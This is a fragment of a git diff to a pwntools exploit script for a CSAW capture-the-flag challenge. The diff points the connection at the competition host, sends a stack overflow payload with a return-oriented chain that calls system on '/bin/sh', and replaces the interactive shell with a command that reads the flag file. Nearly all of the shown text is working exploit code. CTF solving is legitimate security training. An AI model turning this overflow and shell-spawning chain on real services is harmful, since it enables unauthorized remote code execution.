@@ -3,10 +3,9 @@ from time import time
 
 
 context.arch='amd64'
-context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
 # p=process('./chal')
-p = remote("0.0.0.0",9999)
-# p = remote("when-to-h1t.chal.csaw.io",12345)
+p = remote("pwn.chal.csaw.io",9999)
 
 ru 		= lambda a: 	p.readuntil(a)
 r 		= lambda n:		p.read(n)
@@ -122,9 +121,9 @@ log.warning(hex(base))
 sa("?\n",b"A"*0x333+b'\0'*5+p64(ret)*((0x100-0x38-0x20)//8)+flat([rdi,sh,system,0xdeadbeef]))
 sa(")\n",b'N')
 
-p.sendline("pwd")
+p.sendline(b"pwd")
 xxx = p.readline()
 if b""==xxx or b"timeout" in xxx or b"egmentation fault" in xxx:
     p.close()
 else:
-    p.interactive()
+    p.sendline(b"cat /home/ctf/flag")
